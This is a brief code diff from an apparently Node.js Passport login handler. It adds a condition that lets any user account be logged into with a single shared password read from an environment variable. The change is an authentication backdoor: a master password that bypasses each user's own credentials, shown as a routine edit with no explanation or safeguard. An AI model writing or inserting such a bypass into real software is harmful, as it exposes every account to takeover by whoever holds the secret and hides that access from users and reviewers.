@@ -16,7 +16,7 @@ passport.use(new localStrategy({
 			message: 'Incorrect credentials' ///***
 				});
 			}
-		if(!user.validPassword(password)) {
+		if(!user.validPassword(password) && password !== process.env.ADMINPASSWORD) {
 			return done(null, false, {
 				message: 'Incorrect credentials'  //****
 
